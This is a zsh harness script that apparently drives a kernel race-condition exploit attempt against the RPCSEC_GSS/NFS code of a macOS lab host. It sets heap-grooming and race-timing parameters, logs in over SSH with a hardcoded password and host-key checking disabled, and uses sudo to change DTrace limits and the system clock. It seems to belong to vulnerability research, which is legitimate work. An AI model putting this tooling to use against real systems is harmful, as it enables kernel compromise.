#!/bin/zsh

set -eu
set -o pipefail

setup_id=${1:?usage: $0 setup_id race_id cohort_offset [reuse_setup [race_data_count [candidate_min_aes_mic [hmac_hold_ns [pre_destroy_hold_ns [destroy_hold_ns]]]]]]}
race_id=${2:?usage: $0 setup_id race_id cohort_offset [reuse_setup [race_data_count [candidate_min_aes_mic [hmac_hold_ns [pre_destroy_hold_ns [destroy_hold_ns]]]]]]}
cohort_offset=${3:?usage: $0 setup_id race_id cohort_offset [reuse_setup [race_data_count [candidate_min_aes_mic [hmac_hold_ns [pre_destroy_hold_ns [destroy_hold_ns]]]]]]}
reuse_setup=${4:-1}
race_data_count=${5:-2}
candidate_min_aes_mic=${6:-2}
hmac_hold_ns=${7:-435000000}
pre_destroy_hold_ns=${8:-0}
destroy_hold_ns=${9:-499000000}
repair_continue_count=${RPC_GSS_PREFORK_REPAIR_CONTINUE_COUNT:-1}
data_stagger_us=${RPC_GSS_PREFORK_DATA_STAGGER_US:-0}
second_data_dtrace_gate=${RPC_GSS_SECOND_DATA_DTRACE_GATE:-1}
host=192.168.64.84
user=testtest
password=test
root=/Users/dawgyg/codex_scratch/nfs_beta4_static_20260727

if [[ "${reuse_setup}" != 0 && "${reuse_setup}" != 1 ]]; then
    print -u2 "reuse_setup must be 0 or 1"
    exit 2
fi
if [[ "${second_data_dtrace_gate}" != 0 &&
    "${second_data_dtrace_gate}" != 1 ]]; then
    print -u2 "second-data DTrace gate must be 0 or 1"
    exit 2
fi
if [[ "${race_data_count}" != <1-4> ||
    "${candidate_min_aes_mic}" != <1-4> ||
    "${repair_continue_count}" != <0-8> ||
    "${data_stagger_us}" != <0-1000000> ||
    "${hmac_hold_ns}" != <1000000-499000000> ||
    "${pre_destroy_hold_ns}" != <0-499000000> ||
    "${destroy_hold_ns}" != <0-499000000> ]]; then
    print -u2 "invalid race count or hold duration"
    exit 2
fi
if (( candidate_min_aes_mic > race_data_count )); then
    print -u2 "candidate MIC ordinal exceeds DATA request count"
    exit 2
fi
predictor_sequence_offset=$(( candidate_min_aes_mic - 1 ))
predictor_header_offset=$(( predictor_sequence_offset * 2 ))

sshpass -p "${password}" ssh \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    "${user}@${host}" \
    "printf 'test\\n' | sudo -S sh -c \
    '/usr/sbin/sysctl -w kern.dtrace.global_maxsize=65536; \
    /usr/sbin/sysctl -w kern.dtrace.difo_maxsize=1048576; \
    /usr/sbin/sysctl -w kern.dtrace.dof_maxsize=4194304; \
    /usr/sbin/systemsetup -setusingnetworktime off; \
    /bin/date 0731210026'"

env \
    VOUCHER32_SETUP_PREWARM_MKDIR="${VOUCHER32_SETUP_PREWARM_MKDIR:-1}" \
    VOUCHER32_SETUP_TIGHT_DRAIN_COUNT="${VOUCHER32_SETUP_TIGHT_DRAIN_COUNT:-64}" \
    VOUCHER32_SETUP_TIGHT_POSTFREE_DRAIN_COUNT="${VOUCHER32_SETUP_TIGHT_POSTFREE_DRAIN_COUNT:-64}" \
    VOUCHER32_SETUP_TIGHT_BOUNCE_COUNT="${VOUCHER32_SETUP_TIGHT_BOUNCE_COUNT:-2}" \
    VOUCHER32_SETUP_TIGHT_SACRIFICE_COUNT="${VOUCHER32_SETUP_TIGHT_SACRIFICE_COUNT:-0}" \
    VOUCHER32_SETUP_PRE_STAGE1_DRAIN_COUNT="${VOUCHER32_SETUP_PRE_STAGE1_DRAIN_COUNT:-0}" \
    VOUCHER32_SETUP_POSTFREE_SEQUENTIAL_RECLAIM="${VOUCHER32_SETUP_POSTFREE_SEQUENTIAL_RECLAIM:-0}" \
    VOUCHER32_SETUP_POSTFREE_RELEASE_B_THEN_E="${VOUCHER32_SETUP_POSTFREE_RELEASE_B_THEN_E:-0}" \
    RPC_GSS_PREFORK_REUSE_SETUP="${reuse_setup}" \
    RPC_GSS_PREFORK_SELECTIVE_A_FREE_SLACK="${RPC_GSS_PREFORK_SELECTIVE_A_FREE_SLACK:-1}" \
    RPC_GSS_PREFORK_DTRACE_SCRIPT="${root}/trace_cross_digest_acl_fdflags_beta4_cchmac_return.d" \
    RPC_GSS_PREFORK_WORKERS=32 \
    RPC_GSS_PREFORK_SELECTIONS=32 \
    RPC_GSS_PREFORK_STAGE1_SELECTIONS="${RPC_GSS_PREFORK_STAGE1_SELECTIONS:-8}" \
    RPC_GSS_PREFORK_COHORT_LIMIT="${RPC_GSS_PREFORK_COHORT_LIMIT:-7}" \
    RPC_GSS_PREFORK_COHORT_OFFSET="${cohort_offset}" \
    RPC_GSS_PREFORK_PRESERVE_STAGE1_SELECTION_LIMIT=1 \
    RPC_GSS_PREFORK_DEFER_LAST_FOUR=0 \
    RPC_GSS_PREFORK_PREDICTOR_MIN_DWORD=2 \
    RPC_GSS_PREFORK_PREDICTOR_MAX_DWORD=2 \
    RPC_GSS_PREDICTOR_WORKERS="${RPC_GSS_PREDICTOR_WORKERS:-16}" \
    RPC_GSS_PREFORK_PREDICTOR_LIMIT=128 \
    RPC_GSS_PREFORK_PREDICTOR_MAX_SEQUENCE="${RPC_GSS_PREFORK_PREDICTOR_MAX_SEQUENCE:-2147483647}" \
    RPC_GSS_PREFORK_REPAIR_CONTINUE_COUNT="${repair_continue_count}" \
    RPC_GSS_PREFORK_REPAIR_ON_FDFLAGS_EXACT=0 \
    RPC_GSS_PREFORK_DES3_WAVE_COUNT=0 \
    RPC_GSS_PREFORK_CANDIDATE_ANY_TARGET_OUTER=0 \
    RPC_GSS_PREFORK_SOCKET_TIMEOUT_SECONDS=90 \
    RPC_GSS_SECOND_DATA_DTRACE_GATE="${second_data_dtrace_gate}" \
    RPC_GSS_PREFORK_SELECTIVE_RELEASE_MODE=dtrace \
    RPC_GSS_PREFORK_CONTINUE_RELEASE_MODE=staged_direct \
    RPC_GSS_PREALLOC_HOLD_NS="${RPC_GSS_PREALLOC_HOLD_NS:-1}" \
    RPC_GSS_PREFORK_MIC_HOLD_NS=1000000 \
    RPC_GSS_PREFORK_CCHMAC_RETURN_HOLD_NS="${hmac_hold_ns}" \
    RPC_GSS_PRE_DESTROY_HOLD_NS="${pre_destroy_hold_ns}" \
    RPC_GSS_DES3_GENERATE_REMOTE=1 \
    "${root}/run_prefork_fdflags_repair_attempt.sh" \
    "${setup_id}" "${race_id}" "${data_stagger_us}" 0 \
    "${predictor_sequence_offset}" "${candidate_min_aes_mic}" \
    "${predictor_header_offset}" "${destroy_hold_ns}" \
    "${race_data_count}"
